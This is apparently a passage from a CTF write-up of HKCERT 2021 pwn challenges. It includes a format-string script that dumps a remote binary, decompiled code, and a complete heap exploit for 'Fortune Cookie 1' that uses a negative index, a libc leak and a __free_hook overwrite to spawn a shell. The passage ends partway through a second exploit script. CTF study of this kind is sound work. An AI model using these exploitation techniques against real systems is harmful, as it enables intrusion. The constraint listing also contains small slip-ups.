+<p>Full dump script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./&#39;</span>
+HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chalp.hkcert21.pwnable.hk&#39;</span>
+PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">28132</span>
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span> <span style="color:#75715e"># i386/amd64</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+<span style="color:#75715e">#elf = ELF(TARGET)</span>
+
+<span style="color:#75715e">#---</span>
+
+output <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400000</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump</span>(addr):
+    sleep(<span style="color:#ae81ff">0.1</span>)
+    p <span style="color:#f92672">=</span> remote(HOST, PORT)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%7$s||||&#34;</span> <span style="color:#f92672">+</span> p64(addr))
+    text <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;||||&#34;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>]
+    p<span style="color:#f92672">.</span>close()
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;trying </span><span style="color:#e6db74">{</span>hex(addr)<span style="color:#e6db74">}</span><span style="color:#e6db74"> : </span><span style="color:#e6db74">{</span>str(text)<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>len(text)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+    <span style="color:#66d9ef">return</span> text
+    
+myfile <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;dump&#34;</span>, <span style="color:#e6db74">&#34;ab&#34;</span>)
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+    <span style="color:#66d9ef">try</span>:
+        <span style="color:#66d9ef">if</span> addr <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x406000</span>:
+            <span style="color:#66d9ef">break</span>
+
+        data <span style="color:#f92672">=</span> dump(addr)
+        <span style="color:#66d9ef">if</span> len(data) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+            myfile<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+            addr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+        <span style="color:#66d9ef">else</span>:
+            myfile<span style="color:#f92672">.</span>write(data)
+            addr <span style="color:#f92672">+=</span> len(data)
+    <span style="color:#66d9ef">except</span>  <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+        <span style="color:#66d9ef">continue</span>
+
+
+<span style="color:#75715e">#p.interactive()</span>
+</code></pre></div><h3 id="step-2-reverse">Step 2: Reverse</h3>
+<p>Now that we have the binary, we can use decompilers like ghidra to look at the original code. There are 3 functions that interest us the most:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">undefined8 <span style="color:#a6e22e">FUN_0040142f</span>(<span style="color:#66d9ef">void</span>)
+
+{
+  <span style="color:#66d9ef">int</span> iVar1;
+  <span style="color:#66d9ef">char</span> local_28 [<span style="color:#ae81ff">32</span>];
+  
+  FUN_004013d9(local_28,<span style="color:#ae81ff">0x1f</span>);
+  iVar1 <span style="color:#f92672">=</span> FUN_00401192(local_28);
+  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+    FUN_004012c8();
+  }
+  <span style="color:#66d9ef">else</span> {
+    printf(local_28);
+    puts(<span style="color:#e6db74">&#34; is not the correct answer.&#34;</span>);
+  }
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_004013d9</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>param_1,<span style="color:#66d9ef">int</span> param_2)
+
+{
+  ssize_t sVar1;
+  
+  sVar1 <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>,param_1,(<span style="color:#66d9ef">long</span>)param_2);
+  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)param_1 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)(<span style="color:#66d9ef">int</span>)sVar1 <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>) {
+    <span style="color:#f92672">*</span>(undefined <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)param_1 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)(<span style="color:#66d9ef">int</span>)sVar1 <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  }
+  <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><p>In <code>FUN_0040142f</code>, we can see the familiar <code>&lt;user_input&gt; is not the correct answer.</code> message is in the else block. So maybe we should try to satisfy the other branching condition, by making <code>FUN_00401192(local_28) == 1</code>. In the last line, <code>FUN_004013d9(local_28,0x1f)</code> is reading string from stdin and preforming some string operations, so <code>local_28</code> shoud be our input string. Let&rsquo;s look at <code>FUN_00401192</code> to see when will this function return <code>1</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">undefined8 <span style="color:#a6e22e">FUN_00401192</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_1)
+
+{
+  <span style="color:#66d9ef">int</span> iVar1;
+  size_t sVar2;
+  undefined8 uVar3;
+  
+  sVar2 <span style="color:#f92672">=</span> strlen(param_1);
+  <span style="color:#66d9ef">if</span> (sVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x13</span>) {
+    <span style="color:#66d9ef">if</span> ((param_1[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;_&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> (param_1[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">==</span> param_1[<span style="color:#ae81ff">6</span>])) {
+      iVar1 <span style="color:#f92672">=</span> strncmp(param_1,<span style="color:#e6db74">&#34;printf&#34;</span>,<span style="color:#ae81ff">6</span>);
+      <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+        iVar1 <span style="color:#f92672">=</span> strncmp(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>,<span style="color:#e6db74">&#34;danger&#34;</span>,<span style="color:#ae81ff">6</span>);
+        <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+          <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">0x12</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;s&#39;</span>) {
+            <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">0x11</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;u&#39;</span>) {
+              <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">0x10</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;o&#39;</span>) {
+                <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> param_1[<span style="color:#ae81ff">7</span>]) {
+                  <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">==</span> param_1[<span style="color:#ae81ff">0x12</span>]) {
+                    uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+                  }
+                  <span style="color:#66d9ef">else</span> {
+                    uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+                  }
+                }
+                <span style="color:#66d9ef">else</span> {
+                  uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+                }
+              }
+              <span style="color:#66d9ef">else</span> {
+                uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+              }
+            }
+            <span style="color:#66d9ef">else</span> {
+              uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+            }
+          }
+          <span style="color:#66d9ef">else</span> {
+            uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+          }
+        }
+        <span style="color:#66d9ef">else</span> {
+          uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+        }
+      }
+      <span style="color:#66d9ef">else</span> {
+        uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+      }
+    }
+    <span style="color:#66d9ef">else</span> {
+      uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    }
+  }
+  <span style="color:#66d9ef">else</span> {
+    uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  }
+  <span style="color:#66d9ef">return</span> uVar3;
+}
+</code></pre></div><p>Let <code>s</code> be the required string. We have</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">len(s) <span style="color:#f92672">=</span> <span style="color:#ae81ff">13</span>
+s[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> s[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;_&#39;</span>
+s[<span style="color:#ae81ff">1</span>:<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;printf&#39;</span>
+s[<span style="color:#ae81ff">10</span>:<span style="color:#ae81ff">15</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;danger&#39;</span>
+s[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;o&#39;</span>
+s[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;u&#39;</span>
+s[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;s&#39;</span>
+s[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> s[<span style="color:#ae81ff">7</span>]
+s[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> s[<span style="color:#ae81ff">18</span>]
+</code></pre></div><p>which is <code>&quot;printf_is_dangerous&quot;</code>.</p>
+<p>Finally, send this string to the server and get flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo printf_is_dangerous | nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span>
+hkcert21<span style="color:#f92672">{</span>l3akinG_the_world_giVE_U_7H3_FLAG<span style="color:#f92672">}</span>
+</code></pre></div><p>flag: <code>hkcert21{l3akinG_the_world_giVE_U_7H3_FLAG}</code></p>
+<h2 id="fortune-cookie-1">Fortune Cookie 1</h2>
+<h3 id="step-1-fund-the-vulnerability">Step 1: Fund the vulnerability</h3>
+<p>This challenge has provided us the source code.</p>
+<p>In edit and read function, the program didn&rsquo;t check the index smaller than 0.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">edit_cookie</span>() {
+    <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> idx;
+    
+    printf(<span style="color:#e6db74">&#34;Which cookie?[0-%d]: &#34;</span>, cookie_num<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+    scanf(<span style="color:#e6db74">&#34;%llu&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
+
+    <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&gt;=</span> cookie_num) {
+        _abort(<span style="color:#e6db74">&#34;Invalid index!&#34;</span>);
+    }
+
+    printf(<span style="color:#e6db74">&#34;New Message: &#34;</span>);
+
+    <span style="color:#66d9ef">int</span> num_read <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, msg[idx], msg_size[idx]<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+    <span style="color:#66d9ef">if</span> (msg[idx][num_read] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
+        msg[idx][num_read] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+    printf(<span style="color:#e6db74">&#34;Done!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">read_cookie</span>() {
+    <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> idx;
+    
+    printf(<span style="color:#e6db74">&#34;Which cookie?[0-%d]: &#34;</span>, cookie_num<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+    scanf(<span style="color:#e6db74">&#34;%llu&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
+
+    <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&gt;=</span> cookie_num) {
+        _abort(<span style="color:#e6db74">&#34;Invalid index!&#34;</span>);
+    }
+
+    printf(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, msg[idx]);
+}
+
+</code></pre></div><p>Which mean we can read and edit the data outside the msg array
+In the address below the msg location, I found a important address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  tele <span style="color:#f92672">(</span>double*<span style="color:#f92672">)</span>&amp;msg-0x10 <span style="color:#ae81ff">20</span>
+0x000055770ddb4fe0│+0x0000: 0x00007f3f8ad10750  →  &lt;__libc_start_main+0&gt; push r14
+0x000055770ddb4fe8│+0x0008: 0x0000000000000000
+0x000055770ddb4ff0│+0x0010: 0x0000000000000000
+0x000055770ddb4ff8│+0x0018: 0x00007f3f8ad2a2e0  →  &lt;__cxa_finalize+0&gt; push r15
+0x000055770ddb5000│+0x0020: 0x0000000000000000
+0x000055770ddb5008│+0x0028: 0x000055770ddb5008  →  <span style="color:#f92672">[</span>loop detected<span style="color:#f92672">]</span>
+0x000055770ddb5010│+0x0030: 0x0000000000000000
+0x000055770ddb5018│+0x0038: 0x0000000000000000
+0x000055770ddb5020│+0x0040: 0x00007f3f8b0b5620  →  0x00000000fbad2887
+0x000055770ddb5028│+0x0048: 0x0000000000000000
+0x000055770ddb5030│+0x0050: 0x00007f3f8b0b48e0  →  0x00000000fbad208b
+0x000055770ddb5038│+0x0058: 0x0000000000000000
+0x000055770ddb5040│+0x0060: 0x00007f3f8b0b5540  →  0x00000000fbad2087
+0x000055770ddb5048│+0x0068: 0x0000000000000000
+0x000055770ddb5050│+0x0070: 0x0000000000000000
+0x000055770ddb5058│+0x0078: 0x0000000000000000
+0x000055770ddb5060│+0x0080: 0x000055770e9c5240  →  <span style="color:#e6db74">&#34;The best thing to do first thing in the morning is&#34;</span>
+0x000055770ddb5068│+0x0088: 0x000055770e9c52a0  →  <span style="color:#e6db74">&#34;Every 60 seconds in africa a minute passes.&#34;</span>
+0x000055770ddb5070│+0x0090: 0x000055770e9c52e0  →  <span style="color:#e6db74">&#34;Monday hates you, too.&#34;</span>
+0x000055770ddb5078│+0x0098: 0x000055770e9c5300  →  <span style="color:#e6db74">&#34;Money is not everything. There&#39;s always credit car[...]&#34;</span>
+</code></pre></div><p>You can see in <code>0x000055770ddb5008</code>, there has a address pointer to itself.</p>
+<p>We can control this address by index -11 to get the arbitrary write and read.</p>
+<h3 id="step-2-leak-address">Step 2: Leak address</h3>
+<p>By input -11 to show function, we can leak the data of that address which is it&rsquo;s address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">7</span>)
+target <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x80</span>
+info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;target: </span><span style="color:#e6db74">{</span>hex(target)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">27</span>):
+    create(<span style="color:#ae81ff">0x88</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+</code></pre></div><h3 id="step-3-leak-libc-address-1">Step 3: Leak libc address</h3>
+<ol>
+<li>edit it point to our controlable place, which is the address to store #5 chunk address</li>
+<li>edit it point to 0x000055770ddb5020 where stored a address of libc</li>
+<li>show the #5 chunk to leak the libc address</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">target <span style="color:#f92672">=</span> leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x80</span>
+edit(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>, p64(target))
+edit(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>, p64(target<span style="color:#f92672">-</span><span style="color:#ae81ff">0x68</span>))
+show(<span style="color:#ae81ff">5</span>)
+p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>)
+<span style="color:#75715e">#input()</span>
+libc_base <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3c5620</span>
+info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc_base: </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+free_hook <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__free_hook&#39;</span>]
+system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+</code></pre></div><h3 id="step-4-get-shell-1">Step 4: Get shell</h3>
+<p>Change the place pointed to #5 chunk addrss point to <em>__free_hook</em> and edit it with <code>system</code> address.
+Call <code>eatCookie()</code> to free a chunk contains /bin/sh` to get shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">edit(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>, p64(free_hook))
+edit(<span style="color:#ae81ff">5</span>, p64(system))
+eat()
+</code></pre></div><p>Full exploit script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
+HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chalp.hkcert21.pwnable.hk&#39;</span>
+PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">38230</span>
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span> <span style="color:#75715e"># i386/amd64</span>
+<span style="color:#75715e">#context.log_level = &#39;debug&#39;</span>
+elf <span style="color:#f92672">=</span> ELF(TARGET)
+
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
+    p <span style="color:#f92672">=</span> remote(HOST, PORT)
+    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.23.so&#34;</span>)
+<span style="color:#66d9ef">else</span>:
+    p <span style="color:#f92672">=</span> process(TARGET ,env <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>: <span style="color:#e6db74">&#34;./libc-2.23.so&#34;</span>})
+    libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
+    gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;&#39;&#39;&#39;</span>
+    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;gdb&#39;</span>:
+       gdb<span style="color:#f92672">.</span>attach(p, gdbscript<span style="color:#f92672">=</span>gdbscript)
+
+<span style="color:#75715e">#---</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">eat</span>():
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(size, data):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;How long is the message?&#34;</span>, str(size))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Input your message:&#34;</span>, data)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx, data):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Which cookie?&#34;</span>, str(idx))
+    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;New Message:&#34;</span>, data)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(idx):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#39;4&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Which cookie?&#34;</span>, str(idx))
+
+<span style="color:#75715e">#print(p.recvline())</span>
+show(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>)
+p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">7</span>)
+leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;leak: </span><span style="color:#e6db74">{</span>hex(leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">27</span>):
+    create(<span style="color:#ae81ff">0x88</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+
+target <span style="color:#f92672">=</span> leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x80</span>
+edit(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>, p64(target))
+edit(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>, p64(target<span style="color:#f92672">-</span><span style="color:#ae81ff">0x68</span>))
+show(<span style="color:#ae81ff">5</span>)
+p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>)
+<span style="color:#75715e">#input()</span>
+libc_base <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3c5620</span>
+info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc_base: </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+free_hook <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__free_hook&#39;</span>]
+system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+
+edit(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>, p64(free_hook))
+edit(<span style="color:#ae81ff">5</span>, p64(system))
+eat()
+
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="fortune-cookie-2">Fortune Cookie 2</h2>
+<p>This challenge has the source as Fortune Cookie 1
+So I used the same exploit script with a little change related to the different of libc version.</p>
+<p>Full exploit script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
+HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chalp.hkcert21.pwnable.hk&#39;</span>
+PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">38231</span>
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span> <span style="color:#75715e"># i386/amd64</span>
+<span style="color:#75715e">#context.log_level = &#39;debug&#39;</span>
+elf <span style="color:#f92672">=</span> ELF(TARGET)
+
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
+    p <span style="color:#f92672">=</span> remote(HOST, PORT)
+    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.27.so&#34;</span>)
+<span style="color:#66d9ef">else</span>:
+    p <span style="color:#f92672">=</span> process(TARGET ,env <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>: <span style="color:#e6db74">&#34;./libc-2.27.so&#34;</span>})
+    libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
+    gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;&#39;&#39;&#39;</span>
